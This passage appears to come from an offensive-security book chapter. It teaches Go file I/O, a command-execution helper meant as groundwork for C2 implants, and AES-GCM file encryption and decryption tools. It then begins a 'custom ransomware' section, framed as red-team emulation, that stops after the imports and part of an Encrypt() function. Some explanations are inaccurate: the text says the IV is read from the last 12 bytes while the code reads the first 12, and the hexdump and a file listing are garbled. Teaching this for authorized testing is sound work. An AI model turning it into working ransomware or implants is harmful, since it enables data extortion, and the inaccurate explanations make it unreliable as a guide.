The only time you need to explicitly declare type values in Go is when you are defining a variable but not yet assigning it (such as with an unassigned global variable).

After this assignment, you get into the core function of your file-reading code. Using the ioutil.ReadFile() function, you pass in your fileName variable. This function will read your file and return two values: the file content and an error value. (In Go, you can assign two variables at once from a function call’s return by placing a comma between them.) If no error returns, the err variable will be set to nil; otherwise, you handle the error by calling the log.Fatal() function, which passes in the error value, prints it with fmt.Print(), and then calls os.Exit(1) for you. This way, you save a line of code and exit the program if an error occurs. For a file-reading program, this is great; after all, if the file can’t be read, there’s no point in the program continuing.

NOTE
To ignore an error value, you can replace its variable name with an underscore (_); however, using an underscore every time you have an error to handle is a terrible practice. It may seem quick and convenient, but error handling in Go takes very little time, and if you regularly ignore errors, you’ll never know the cause of any bugs in your code. If you don’t have a good reason to ignore an error, it’s always better to properly handle it.

If your program has no errors, you print out the data you read from your file by calling the fmt.Println() function and passing in your content variable. You might notice that the content variable has a string() statement wrapped around it. This is a data type casting call in Go. The ioutil.ReadFile() function returns a data type of []byte for byte slice, which is essentially an array of bytes in Go. Since most iotuil calls are built for handling bytes, they often also return bytes or byte slices. Fortunately, you know your data is a string, so you can easily cast your bytes to a string that a fmt.Println() function call can read.

If your file contained numbers that you needed to perform an operation with or multiple data types for varying purposes, you would want to handle them differently. You could extract data from the byte slice, similarly to the way you would handle an array in other languages, and cast the data appropriately from there. In this case, casting as a string completes your read_data.go program, so it is ready to read the file and print its data.

Running the File-Reading Program with go build
You can run a Go program in one of two ways. Since Go is a compiled language, your first option is to build the program by using the go build command from the directory where you’ve saved it:

$ go build read_data.go
The go build command will take in your main Go program file and create a binary that can be executed on any platform native to your host operating system. To compile this to a program that will run on Windows, for example, you’d specify the corresponding environment variable for that operating system. This environment variable for operating systems is GOOS, and for 32-bit/64-bit architecture it’s GOARCH, so you would run export GOOS=windows GOARCH=amd64 before running the go build command. This will create an executable file that will run on Windows but not at all on the Linux system used to develop the example program.

The executable file will be located in the same directory as your Go program code, and you can run it just as you would any other executable for your host operating system:

$ ls
data.txt read_data read_data.go
$ ./read_data
some data
You can see that the executable successfully reads the data.txt file and prints that data to the terminal.

Running the File-Reading Program with go run
An alternative way to run the file-reading program, and the one you’ll use going forward, is to call the go run command:

$ go run read_data
some data
This command seemingly functions like an interpreter, but it’s compiling and executing the program in one step. Its main difference from go build is that it does not generate an executable for you. This makes go run useful for development, because you can execute your program in a single step as many times as you want without having to rebuild and execute the binary it generates over and over again.

Your complete read_data.go file should look like Listing 3-1.

package main

import (
    "fmt"
    "io/ioutil"
    "log"
)

func main() {
    // Specify the filename.
    fileName := "data.txt"

    // Read the file content.
    content, err := ioutil.ReadFile(fileName)
    if err != nil {
        log.Fatal(err)
    }

    // Print the file content to the console.
    fmt.Println(string(content))
Listing 3-1: The complete Go file-reading program

Setting Up the File-Writing Functionality
Your file-reading program is working great at this point. Now you need to go in the other direction and write to the file. This process is fairly similar and just as straightforward (skip ahead to Listing 3-2 to see the full code). The only real difference is in the iotuil functions you’ll use.

First, save a new file called file_write.go in the same location as your previous program and then define the package and library imports in it just as you did before:

package main

import (
    "io/ioutil"
    "log"
)

func main() {
    // Specify the filename.
    fileName := "new_data.txt"
    content := []byte("some new data")

    // Write data to the file.
    err := ioutil.WriteFile(fileName, content, 0644)
    if err != nil {
        log.Fatal(err)
    }
}
This time you don’t need the fmt library since you won’t be printing out any data unless there is an error. You’re using the log library again to print a log.Fatal() error if an error occurs.

In this program’s first line, again you define your fileName variable and give it a value of new_data.txt. Next, you define a content variable, which will contain the data you’re going to write to the new_data.txt file. (In practice, you can name this variable anything you want, but content is a good choice because it indicates the variable’s purpose.) This data needs to be a byte slice (that is, have a byte[] data type), but you don’t need to define individual elements for it, as Go will fairly intuitively divide your string of data into the slice for you. In other languages, you might need to define each character and space as individual elements in an array, but here, passing in the string some new data works without issues.

Finally, you pass your filename and newly created byte slice into the ioutil.WriteFile() function. This function takes three arguments: the filename, the file content, and the file permission bits. You can set these permission bits to anything you want; just be sure you understand what they are (for details, check out the chart at https://en.wikipedia.org/wiki/File-system_permissions). For example, the bits 0777 will make your file readable, writable, and executable by anyone of any privilege on the system, which can be dangerous if you want to restrict access to your file based on user privileges. The bits 0644 make your file read-only for anyone on the system, writable only for the user, and not executable at all (which makes sense, as it’s a text file and not a program).

The ioutil.WriteFile() function call also returns an error value just like the ioutil.ReadFile() function call. Since you’re writing data instead of reading it, no other data is returned, but any resulting error will be due to an issue with writing the file. Again, if the error is not equal to nil, you simply call log.Fatal() and throw the error, exiting the program. Otherwise, the program completes and writes the file successfully.

Listing 3-2 shows how your final file_write.go file should look.

package main

import (
    "io/ioutil"
    "log"
)

func main() {
    // Specify the filename.
    fileName := "new_data.txt"
    content := []byte("some new data")

    // Write data to the file.
    err := ioutil.WriteFile(fileName, content, 0644)
    if err != nil {
        log.Fatal(err)
    }
}
Listing 3-2: The complete Go file-writing program

That’s all it takes to write a file in Go. Enter go run file_write.go to execute your program, and you should see that it creates a new file called new_data.txt in the same directory where it resides. Opening the file reveals that the text some new data was successfully written to the new_data.txt file.

Combining the Reading and Writing Programs
Now that you can read and write data with Go, you’ll combine the two programs into a single script (skip ahead to Listing 3-3 to see the full code). Open a new text file and save it as read_write_data.go. Then, once again, define package main and import the same libraries as in read_file.go, plus the os library:

package main

import (
    "fmt"
    "io/ioutil"
    "log"
    "os"
)
The os library will introduce command execution capabilities at the operating system level that Go can perform in the context of your program. In this case, you’ll use the library to delete your new file after it has run successfully. First, however, you need to define your main() function as follows:

func main() {
    // Specify the filename.
    fileName := "new_data_other.txt"
    content := []byte("some other new data")

    // Write data to the file.
    err := ioutil.WriteFile(fileName, content, 0644)
    if err != nil {
        log.Fatal(err)
    }
In the main() function, you once again define a filename (in this example, new_data_other.txt), as well as a byte slice of data that will be written to this file.

From here, add the same code you used earlier to read the file:

    // Read the file content.
    content, err = ioutil.ReadFile(fileName)
    if err != nil {
        log.Fatal(err)
    }
To read the file, you can continue to pass down your fileName variable and call the ioutil.ReadFile() function the same way you did before. After the file is read, you print its content to the terminal like so:

    // Print the file content to the console.
    fmt.Println(string(content))
The last bit of code is the call to remove your newly created file by passing the fileName variable to the os.Remove() function:

    // Attempt to remove the file.
    err = os.Remove(fileName)
    if err != nil {
        fmt.Println("Error:", err)
        return
    }

    fmt.Printf("File %s deleted successfully.\n", fileName)
}
If an error occurs during the file deletion, this time you handle it a little differently. Instead of calling log.Fatal(), you call fmt.Printlnt() and then return. This approach is similar to using log.Fatal(), but instead of calling os.Exit(1) in the background, you are gracefully returning after printing your error, which exits the program. This option is just as valid, although it is one extra line of code. Exiting with an error code (or exiting at all) may not always be desirable. In this case, you’re still effectively exiting your program because there’s nothing left to execute after returning from main. Since you don’t want to print that final success message, returning after displaying the error is a bit cleaner than writing an if...else conditional to ensure that you don’t reach that last line.

If no errors occur, the program uses a fmt.Printf() function call to indicate that the file was successfully deleted. The Printf() call specifically allows you to print a format string, a very C-like syntax to print variables. Printf() comes with a lot of flexibility for displaying various data types, but since you’re just printing a string, simple concatenation with a + operator would also work just fine here.

All these options showcase how you can write similar functionality by using different paradigms. There’s no “right” way, but sometimes one is more appropriate for a given circumstance. In this case, another log.Fatal() call would have probably been more appropriate, as the format string printing is a bit overkill.

The final read_write_data.go should look like Listing 3-3.

package main

import (
    "fmt"
    "io/ioutil"
    "log"
    "os"
)

func main() {
    // Specify the filename.
    fileName := "new_data_other.txt"
    content := []byte("some other new data")

    // Write data to the file.
    err := ioutil.WriteFile(fileName, content, 0644)
    if err != nil {
        log.Fatal(err)
    }

    // Read the file content.
    content, err = ioutil.ReadFile(fileName)
    if err != nil {
        log.Fatal(err)
    }

    // Print the file content to the console.
    fmt.Println(string(content))

    // Attempt to remove the file.
    err = os.Remove(fileName)
    if err != nil {
        fmt.Println("Error:", err)
        return
    }

    fmt.Printf("File %s deleted successfully.\n", fileName)
}
Listing 3-3: The complete Go file-reading and file-writing program

Now run your program with go run again:

$ go run read_write_data.go
some other new data
File new_data_other.txt deleted successfully.
You should see that the data is written and that the new file you created, new_data_other.txt, has been successfully deleted almost as quickly as it was written and read. Without running an automated command to watch the directory, you may not even have seen the file being created. To see the file being created before it is read, simply remove the file-deletion line. If you run the tool again, you should see the same output, minus the file-deletion confirmation. If you add the deletion line back in, Go will remove the file upon the second run, after overwriting it and reading it once again.

File operations are at the core of the rest of the code you are going to write. The better you understand these fundamental steps, the better you’ll be able to grasp the more complex programs of this chapter as you move forward. The next utility you’ll write will help you with the fundamentals you need for your capstone project of this chapter: writing C2 implants.

Command Execution with the os Library
Before you can write C2 implants to execute commands that you issue, you need to give Go instructions for handling those commands. The os library contains a module called exec that lets you do just that.

To start building your simple command-execution program, open a new file and save it as exec.go (skip ahead to Listing 3-4 to see the full code). Then define two functions, runCommand() and your main() entry point function:

package main

import (
    "fmt"
    "os"
    "os/exec"
)

func runCommand(command string, args ...string) (string, error) {

}
func main() {
As usual, you begin by defining package main and your imports: os and os/exec to handle command execution, and fmt to print data to the console. When defining the runCommand() function, you require two arguments. The first is string, which is the command that will be passed in, and the second is args, a string slice containing your arguments. The ellipsis notation (...) tells Go to expect this to be a variadic function, a function with parameters that can accept any number of arguments. The runCommand() function will return a string as output, and an error for any error that might be thrown upon the command’s execution.

For now, you’ll skip ahead from the runCommand() function and begin defining the main() function as follows:

func main() {
    // Replace the command and arguments with the desired system command.
    command := "id"
    // args := []string{"-la"}

    // Run the command.
    output, err := runCommand(command)

    if err != nil {
        fmt.Println("Error:", err)
        os.Exit(1)
    }

    // Print the command output.
    fmt.Println("Command Output:")
    fmt.Println(output)
}
First, you create a variable called command and give it a static string value (in this case, id); this will be the base command your runCommand() function will execute. Next, you create the args string slice. For now this value is commented out, but it will eventually contain any arguments to the runCommand() function. The next line is where you will execute the runCommand() function and pass it your command variable. This function will return a string and an error, as just noted. In main() you’ll capture the string value in the variable output and handle the error just as you did in the previous program. In the error check, you specify to write the error if one occurs, and then exit with the error code 1. This is a manual implementation of the log.Fatal() function you used earlier in the chapter; you could use log.Fatal() here instead, and it would work exactly the same. Finally, you print a helpful message indicating that there is command output and then print the output variable to the console.

Now, you’ll return to the runCommand() function:

func runCommand(command string, args ...string) (string, error) {

    cmd := exec.Command(command, args...)

    // Capture the output.
    output, err := cmd.CombinedOutput()

    if err != nil {
        return "", err
    }

    return string(output), nil
}
You begin by calling the exec.Command() function and storing what it returns in a variable called cmd. The exec.Command() function will pass through your command string and any args and then return a structure or object that contains many properties you can use in your program. In this case, the only property you care about is the CombinedOutput() function. You access CombinedOutput() by calling it from your newly assigned cmd variable as cmd.CombinedOutput(). This function will return any output from your command execution; if that output spans multiple lines, they’ll be combined into one slice that you can use however you see fit. The cmd.CombinedOutput() function also returns an error. In this case, since you’ve already implemented error handling in your main() function, all you need to do is return an empty string and nil if an error occurs.

As a sanity check, drop into the command line and execute the id command as follows:

$ id
uid=1000(ubuntudev) gid=1000(ubuntudev) groups=1000(ubuntudev),27(sudo),999(vboxsf)
Now compare that output to what you get when you run your exec.go program:

$ go run exec.go
                Command Output:
uid=1000(ubuntudev) gid=1000(ubuntudev) groups=1000(ubuntudev),27(sudo),999(vboxsf)
You should get the same output prefixed with the Command Output: line.

Back in main(), change the id command to ls and observe the output:

$ go run exec.go
Command Output:
exec.go
Running ls works just as you would expect it to; you can see that only one file, exec.go, is in the example directory. However, the ls command can provide more details if you pass it certain arguments. Try running the command ls -la:

$ ls -la
total 12
drwxrwxr-x  2 ubuntudev ubuntudev 4096 Nov 12 19:59 .
drwxrwxr-x  11 ubuntudev ubuntudev 4096 Nov 12 18:32 ..
-rw-rw-r--  1 ubuntudev ubuntudev 632 Dec 2 01:24 exec.go
Manually adding the -la argument tells the ls command to list the directories in long listing format and to list all the content, even hidden or empty directories. This way, the listing will display all the file permission information and timestamps.

To have your Go program execute this functionality, uncomment the args variable in main() and assign it the -la flag as the string slice value. After you do that, simply pass the args variable in as a second parameter to the runCommand() function:

func main() {
    // Replace the command and arguments with the desired system command.
    command := "ls"
    args := []string{"-la"}

    // Run the command.
    output, err := runCommand(command, args...)
Listing 3-4 shows how the final exec.go file should look.

package main

import (
    "fmt"
    "os"
    "os/exec"
)

func runCommand(command string, args ...string) (string, error) {

    cmd := exec.Command(command, args...)

    // Capture the output.
    output, err := cmd.CombinedOutput()

    if err != nil {
        return "", err
    }

    return string(output), nil

}

func main() {
    // Replace the command and arguments with the desired system command.
    command := "ls"
    args := []string{"-la"}

    // Run the command.
    output, err := runCommand(command, args...)

    if err != nil {
        fmt.Println("Error:", err)
        os.Exit(1)
    }

    // Print the command output.
    fmt.Println("Command Output:")
    fmt.Println(output)
}
Listing 3-4: The complete Go code-execution program

Now when you run your program, you should see that the argument slice is passed through successfully and the ls -la command returns the same output as when you ran it manually, only now it is being executed by your program instead.

Command execution in Go requires a few steps, but it’s still quite simple. So far you’ve been executing statically defined commands, but later you’ll revise this code to replace the static variables with dynamically populated values that your implant will assign and run as it receives them. Before you begin building a C2 server and implant, however, you need to learn some encryption basics to expand your file I/O knowledge.

File Encryption with Go
File encryption (and decryption) is another stepping stone into writing tool kits for an offensive security engagement. You can use encryption and decryption to obfuscate payloads, secure your client’s data on exfiltration, or even run mock ransomware deployments (the next piece of this implementation, outlined in “Writing Custom Ransomware” on page 120, covers ransomware in more detail).

For this example, you’ll use AES-GCM encryption, which will take a 32-byte key and a 12-byte random initialization vector (IV), a type of nonce. A nonce is an arbitrary value passed as input to cryptographic algorithms to enhance encryption and thwart attacks. You’ll also use new_data.txt, the file you created when implementing file_write.go in “Setting Up the File-Writing Functionality” on page 102. A fair amount of code is involved in this process, but fortunately Go has standard cryptography libraries built in to ensure that you don’t have to “roll your own” cryptography and that you’re using the existing implementations correctly.

NOTE
Cryptography is an advanced topic that is difficult to master. Although I encourage you to dive into researching it further if it interests you, never roll your own cryptography or use untested algorithms for real-world applications. This is one area where using tried-and-true solutions is the best and safest way forward.

Building the Encryption Tool
The first step is to build an encryption tool (skip ahead to Listing 3-5 to see the full code). Just as before, you’ll scaffold out the functions you’ll be implementing before filling in their logic. Open a new file, save it as encrypt.go, and add the following to it:

package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "fmt"
    "io/ioutil"
)

// GenerateRandomBytes generates random bytes of the given length.
func GenerateRandomBytes(length int) ([]byte, error) {

}

// EncryptFile encrypts a file with AES-256-GCM and writes the encrypted content to a new file.
func EncryptFile(inputFile, outputFile string, key []byte) error {

}

func main(){

}
After defining package main and your imports (mostly crypto libraries from Go’s standard library, along with the io library for file handling and fmt for printing), you define three functions. The first, GenerateRandomBytes(), is a helper function you’ll use to generate the random 12-byte IV in your encryption logic. Later you’ll use built-in functions to generate the IV, but for now you’ll do it yourself. The next function, EncryptFile(), will encrypt the data you pass to it and write a new encrypted file. Finally, main() yet again serves as your program’s entry point.

In the main() function, define the following variables:

func main() {
    // Replace these values with your filenames and AES key.
    inputFile := "../Files/new_data.txt"
    outputFile := "encrypted_file.bin"

    key := []byte("01234567890123456789012345678901") // 32 bytes for AES-256

    err := EncryptFile(inputFile, outputFile, key)
    if err != nil {
        fmt.Println("Error:", err)
    }
}
The first variable, inputFile, is the location of the file that will be encrypted—in this case, new_data.txt. The second variable is outputFile, a raw binary file called encrypted_file.bin. Next up is the key variable, a 32-byte key that is stored as a byte slice. This can be any 32-byte value, but here it is a repeated series of the numbers 0 to 9. This key is critical, as it is essentially the password for both encryption and decryption (it must be the same for both; otherwise, you won’t be able to recover the encrypted data). In the real world, you should keep the key top secret (don’t store it in your program) and avoid using such an easily guessed value like 0 to 9 repeating, but this works fine for your proof of concept. Finally, in the err variable, you call the EncryptFile() function and pass it your inputFile, outputFile, and key values as parameters. EncryptFile() will return an error, which you’ll handle simply by printing it.

Next, you’ll implement the body of the GenerateRandomBytes() function:

// GenerateRandomBytes generates random bytes of the given length.
func GenerateRandomBytes(length int) ([]byte, error) {

    randomBytes := make([]byte, length)
    _, err := rand.Read(randomBytes)
    if err != nil {
        return nil, err
    }
    return randomBytes, nil
}
This function takes in a parameter of length, which is an integer value.

NOTE
In AES-GCM, the length value will always be 12, so you could define a static value here if you wanted. Since GenerateRandomBytes() is a helper function, however, it’s a better practice to implement length dynamically in case you need to use it with other cryptographic functions later.

Once GenerateRandomBytes() executes, it uses the make() function to create a randomized byte slice of size length that you’ll store in the randomBytes variable and pass into a function called rand.Read(). The rand.Read() function calls Go’s built-in rand library and reads in your byte slice, whose bytes will be fully randomized to be used as your IV. There’s no need to assign the value returned from rand.Read() since it’s just the length of the random byte slice, which you have no use for. Next comes your error-handling logic; if no error occurs, you return the randomBytes slice.

With your helper function implemented, now you’ll begin to create your encryption logic in the EncryptFile() function like so:

func EncryptFile(inputFile, outputFile string, key []byte) error {

    // Read the plaintext content from the input file.
    plaintext, err := ioutil.ReadFile(inputFile)
    if err != nil {
        return err
    }

    // Generate a new AES block cipher with the provided key.
    block, err := aes.NewCipher(key)
    if err != nil {
        return err
    }
The first step is to define the plaintext value, which is simply the text contained in the text file you want to encrypt (new_data.txt). To get this, you use the ioutil.ReadFile() function just as you did in the file_read.go program. Then you create a new AES block cipher object by calling the aes.NewCipher() function and passing it the 32-byte key.

With the block cipher defined, you can now create a new AES-GCM cipher by calling cipher.NewGCM() and passing in the cipher block you just created:

    // Generate a random IV with the correct length (12 bytes for AES-GCM).
    iv, err := GenerateRandomBytes(12)
    if err != nil {
        return err
    }

    // Create a new AES-GCM cipher block mode.
    aesgcm, err := cipher.NewGCM(block)
    if err != nil {
        return err
    }
This is also where you call the GenerateRandomBytes() helper function you just created. This function takes in a value of 12 as the length, returns a randomized IV value that is 12 bytes long, and stores it in the iv variable.

Finally, you need to encrypt the data and write the file:

    // Encrypt the plaintext by using AES-GCM with the generated IV.
    ciphertext := aesgcm.Seal(nil, iv, plaintext, nil)

    // Write the IV and ciphertext to the output file.
    err = ioutil.WriteFile(outputFile, append(iv, ciphertext...), 0644)
    if err != nil {
        return err
    }

    fmt.Printf("Encryption successful. Encrypted file saved as %s\n", outputFile)
    return nil
}
To encrypt the data, you access your new aesgcm object’s Seal() function by calling aesgcm.Seal(). This function is what encrypts your data. You pass it a nil value for the first parameter (which takes in a destination you’re not using), the iv, the plaintext, and another nil value for additional data you aren’t using. This returns an encrypted blob of data that is stored in the ciphertext variable, which you pass to the ioutil.WriteFile() function call just as you did in your file-writing program. The only difference is that you’re also calling append() to append the value of iv to the ciphertext variable, since you don’t know what the IV is.

Check your complete encrypt.go file against Listing 3-5.

package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "fmt"
    "io/ioutil"
)

// GenerateRandomBytes generates random bytes of the given length.
func GenerateRandomBytes(length int) ([]byte, error) {

    randomBytes := make([]byte, length)
    _, err := rand.Read(randomBytes)
    if err != nil {
        return nil, err
    }
    return randomBytes, nil
}

// EncryptFile encrypts a file by using AES-256-GCM and writes the encrypted content to a     // new file.
func EncryptFile(inputFile, outputFile string, key []byte) error {

    // Read the plaintext content from the input file.
    plaintext, err := ioutil.ReadFile(inputFile)
    if err != nil {
        return err
    }

    // Generate a new AES block cipher with the provided key.
    block, err := aes.NewCipher(key)
    if err != nil {
        return err
    }

    // Generate a random IV (with the correct length (12 bytes for AES-GCM).
    iv, err := GenerateRandomBytes(12)
    if err != nil {
        return err
    }

    // Create a new AES-GCM cipher block mode.
    aesgcm, err := cipher.NewGCM(block)
    if err != nil {
        return err
    }

    // Encrypt the plaintext by using AES-GCM with the generated IV.
    ciphertext := aesgcm.Seal(nil, iv, plaintext, nil)

    // Write the IV and ciphertext to the output file.
    err = ioutil.WriteFile(outputFile, append(iv, ciphertext...), 0644)
    if err != nil {
        return err
    }

    fmt.Printf("Encryption successful. Encrypted file saved as %s\n", outputFile)
    return nil

}

func main() {
    // Replace these values with your filenames and AES key.
    inputFile := "../Files/new_data.txt"
    outputFile := "encrypted_file.bin"

    key := []byte("01234567890123456789012345678901") // 32 bytes for AES-256

    err := EncryptFile(inputFile, outputFile, key)
    if err != nil {
        fmt.Println("Error:", err)
    }
}
Listing 3-5: The completed Go encryption program

With all the code in place, you can encrypt your first file:

$ go run encrypt.go
Encryption successful. Encrypted file saved as encrypted_file.bin
If the encryption succeeds, the console should display the helpful confirmation message you printed at the end of your EncryptFile() function.

Now take a look at your encrypted file like so:

$ xxd encrypted_file.bin
00000000: 8c8e adcl 75f3 9d28 dat d124 c7ed 27e3 ... u..(...$.
00000010:4bdb 6b19 e26c dcbe 07d5 f169 b199 3039 K.k..1..09
00000020: 1695 bf5d a611 3b17 c6                 ...]..;,,
You should see a bunch of garbled data. The xxd command is used to create or read binary data as a hexdump, a hexadecimal representation that is easier to read than the ones and zeros of binary format. For an encrypted file that has a lot of nonalphanumeric data, xxd is useful to show that the file is not empty; it’s just filled with encrypted data that looks nonsensical.

Compare the encrypted file to the original:

$ ls -la
drwxrwxr-x 2 ubuntudev ubuntudev 4096 Dec 2 01:44 .
drwxrwxr-x 11 ubuntudev ubuntudev 4096 Nov 12 18:32 ..
-rw-rw-r-- 1 ubuntudev ubuntudev 1476 Nov 12 19:58 decrypt.go
-rw-rw-r-- 1 ubuntudev ubuntudev 41 Dec 2 01:44  encrypted_file.bin
-rw-rw-r-- 1 ubuntudev ubuntudev 1740 Dec 2 01:43 encrypt.go
If you used the string some new data when you created the original file, the file was only 13 bytes long. In comparison, your newly encrypted file is 41 bytes long and filled with what appears to be garbled data. Your encryption appears to have worked successfully! Now you need to get back that data.

Building the Decryption Tool
Writing the decryption function is a fairly similar process, as it’s just the inverse of the encryption operations (skip ahead to Listing 3-6 to see the full code). You will need a key, which you know; the IV, which is in the file you created; and the ciphertext to decrypt.

Open a new file, save it as decrypt.go, and add the following:

package main

import (
    "crypto/aes"
    "crypto/cipher"
    "fmt"
    "io/ioutil"
)

// DecryptFile decrypts a file by using AES-256-GCM and writes the result to a new file.
func DecryptFile(inputFile, outputFile string, key []byte) error {

}

func main(){

}
You start by scaffolding out your program the usual way: by defining package main at the top alongside your imports for the crypto libraries (you won’t need rand this time), io, and fmt. Then you define a new function called DecryptFile(). Since you’re not generating anything this time, you don’t need a helper function to create any random bytes, so all that’s left is defining the main() function:

func main() {
    // Replace these values with your filenames and AES key.
    inputFile := "encrypted_file.bin"
    outputFile := "decrypted_file.txt"
    key := []byte("01234567890123456789012345678901") // 32 bytes for AES-256

    err := DecryptFile(inputFile, outputFile, key)
    if err != nil {
        fmt.Println("Error:", err)
    }
}
This main() function is almost the same as the one before, except that the value of the inputFile variable this time is the file you just created, encrypted_file.bin, and the value of the outputFile is a new text file you’ll be creating to write the decrypted data into, called decrypted_file.txt.

The next value is the key from your encryption program. Remember, this value functions as your password; it is the key that unlocks the data, so be sure to enter it correctly. Finally, you call the DecryptFile() function, passing in inputFile, outputFile, and key, and then handle any errors just as you did before.

Now build out the DecryptFile() function as follows:

func DecryptFile(inputFile, outputFile string, key []byte) error {

    // Read the encrypted content from the input file.
    encryptedData, err := ioutil.ReadFile(inputFile)
    if err != nil {
        return err
    }

    // Extract the IV and ciphertext from the encrypted data.
    iv := encryptedData[:12] // IV length for AES-GCM is 12 bytes.
    ciphertext := encryptedData[12:]
You start by calling iotuil.ReadFile() once again, but this time to read in the encrypted file data. Then you use slicing notation to extract data from the byte slice that gets returned from your file-reading function. The first variable, iv, extracts the last 12 bytes from the binary data; these correspond to the value of the IV that you appended to your decrypted data when writing it. Without this value, you can’t decrypt the file. Finally, you grab the rest of the ciphertext, which is unrelated to the IV value, and store it in the ciphertext variable; to do so, simply invert your slicing notation, telling it to ignore the last 12 bytes and store everything else.

Just as you did in your encryption function, you need to create a new AES-GCM cipher object with all your cryptographic components:

    // Generate a new AES block cipher with the provided key.
    block, err := aes.NewCipher(key)
    if err != nil {
        return err
    }

    // Create a new AES-GCM cipher block mode.
    aesgcm, err := cipher.NewGCM(block)
    if err != nil {
        return err
    }
You start by defining a new cipher block with your key, and then you define a new aesgcm variable using that block.

Now you can call the aesgcm.Open() function to decrypt the file:

    // Decrypt the ciphertext by using AES-GCM with the extracted IV.
    plaintext, err := aesgcm.Open(nil, iv, ciphertext, nil)
    if err != nil {
        return err
    }

    // Write the decrypted content to the output file.
    err = ioutil.WriteFile(outputFile, plaintext, 0644)
    if err != nil {
        return err
    }

    fmt.Printf("Decryption successful. Decrypted file saved as %s\n", outputFile)
    return nil
}
The Seal() function is for encrypting, whereas Open() is for decrypting. The Open() function takes the same arguments as the Seal() function: a nil value for the destination (since you’re not using it), the iv value for the IV, the ciphertext for the data to be decrypted, and another nil for additional data that you’re not using either. Then you store the value returned into the variable plaintext; this is your decrypted data. The final step is to write that data to a file and print a helpful message confirming that the decryption operation was successful if no errors occurred along the way.

Congratulations, you’ve created your own file encryption and decryption utility! Listing 3-6 shows how the final decrypt.go program should look.

package main

import (
    "crypto/aes"
    "crypto/cipher"
    "fmt"
    "io/ioutil"
)

// DecryptFile decrypts a file by using AES-256-GCM and writes the result to a new file.
func DecryptFile(inputFile, outputFile string, key []byte) error {

    // Read the encrypted content from the input file.
    encryptedData, err := ioutil.ReadFile(inputFile)
    if err != nil {
        return err
    }

    // Extract the IV and ciphertext from the encrypted data.
    iv := encryptedData[:12] // IV length for AES-GCM is 12 bytes.
    ciphertext := encryptedData[12:]

    // Generate a new AES block cipher with the provided key.
    block, err := aes.NewCipher(key)
    if err != nil {
        return err
    }

    // Create a new AES-GCM cipher block mode.
    aesgcm, err := cipher.NewGCM(block)
    if err != nil {
        return err
    }

    // Decrypt the ciphertext by using AES-GCM with the extracted IV.
    plaintext, err := aesgcm.Open(nil, iv, ciphertext, nil)
    if err != nil {
        return err
    }

    // Write the decrypted content to the output file.
    err = ioutil.WriteFile(outputFile, plaintext, 0644)
    if err != nil {
        return err
    }

    fmt.Printf("Decryption successful. Decrypted file saved as %s\n", outputFile)
    return nil

}

func main() {
    // Replace these values with your filenames and AES key.
    inputFile := "encrypted_file.bin"
    outputFile := "decrypted_file.txt"
    key := []byte("01234567890123456789012345678901") // 32 bytes for AES-256

    err := DecryptFile(inputFile, outputFile, key)
    if err != nil {
        fmt.Println("Error:", err)
    }
}
Listing 3-6: The complete Go decryption program

Run the program, and you should see the successful decryption message:

$ go run decrypt.go
Decryption successful. Decrypted file saved as decrypted_file.txt
Now take a look at the file’s length:

$ ls -la
drwxrwxr-x 2 ubuntudev ubuntudev 4096 Dec 2 01:44 .
drwxrwxr-x 11 ubuntudev ubuntudev 4096 Nov 12 18:32 ..
-rw-r-r-- 1 ubuntudev ubuntudev 13 Dec 2 01:51  encrypted_file.bin
-rw-rw-r-- 1 ubuntudev ubuntudev 1476 Nov 12 19:58 decrypt .go
-rw-rw-r-- 1 ubuntudev ubuntudev 41 Dec 2 01:44  encrypted_file.bin
-rw-rw-r-- 1 ubuntudev ubuntudev 1740 Dec 2 01:43 encrypt.go
You can see it was written as a 13-byte file, which matches the length of your original new_data.txt file.

Run cat as follows or open the file in a text editor:

$ cat decrypted_file.txt
some new data
You should see that the contents were indeed successfully decrypted; your plaintext has been recovered, confirming that your encryption and decryption programs work exactly as intended.

At this point, you’re 90 percent of the way to writing your own ransomware utility. At the end of the day, all a piece of ransomware does is encrypt data from the filesystem exactly as you’ve just done; the only difference is the dynamic collection of files to encrypt. As a challenge, try to create a ransomware utility before diving into the next part and see how far you get. Do this with caution, as you can absolutely corrupt your system here; be very explicit in what you tell the software to do. The next section includes some best practices and safety checks to incorporate as you create your custom ransomware.

Writing Custom Ransomware
As I’ve stated throughout this book, malware is software, and since ransomware is malware, ransomware is software as well. There’s nothing special about it; it’s just file I/O operations and data encryption algorithms like the code you just wrote. Software you use every day works the same way ransomware does. HTTPS uses TLS to encrypt and decrypt data in transit as you browse the internet. Password manager software encrypts and decrypts your password data. Disk encryption programs, such as FileVault, Linux Unified Key Setup (LUKS), and BitLocker, encrypt files just as you’ve done here. A piece of ransomware is just a disk encryption utility that was deployed for nefarious use. What makes it ransomware depends entirely on how the author or user deploys it on a given system.

Custom ransomware can be an invaluable OST. Defensive professionals can build better signatures and heuristics into their endpoint detection and response (EDR) solutions to prevent ransomware attacks. Offensive professionals can emulate the threat models that cause ransomware to spread on client networks. For an offensive security professional to truly do their job effectively, however, they need to deploy ransomware. It’s all well and good to snuff out attack vectors during a penetration test or a red team exercise, but in the real world it’s a constant game of Whac-A-Mole. New vulnerabilities are constantly being released, and social engineering attacks aren’t going anywhere anytime soon. The best approach is to run real ransomware in a controlled environment to see what would happen in an actual attack scenario.

For an offensive security professional, this means preparing a custom piece of ransomware that performs encryption but without the risk. This allows defenders to evaluate whether their detection tools are working properly so their clients are prepared in the event of a real ransomware deployment. This custom OST also has the benefit of being virtually undetectable by signatures alone; usually for ransomware in the wild, by the time a signature is created, it’s too late; the ransomware has likely already succeeded at least once.

You’ll be reusing a lot of your encryption and decryption code, with some changes for brevity and conciseness (skip ahead to Listing 3-7 to see the full code). Start as usual—by defining package main along with your imports—in a new file called ransomware.go:

package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "fmt"
    "io/ioutil"
    "os"
    "path/filepath"
)
The only new import here is path/filepath, a handy import that will let you enumerate your current filepath and iterate through every file to encrypt or decrypt with your ransomware utility. This is the core difference between your regular encryption and decryption code and this piece of ransomware.

Defining the Encrypt() and Decrypt() Functions
With your baseline items in place, you can define the first function, Encrypt(), as follows:

// Encrypt encrypts the given plaintext by using AES-GCM.
func Encrypt(plaintext []byte, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }

    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }

    nonce := make([]byte, gcm.NonceSize())
    if _, err := rand.Read(nonce); err != nil {
        return nil, err
    }

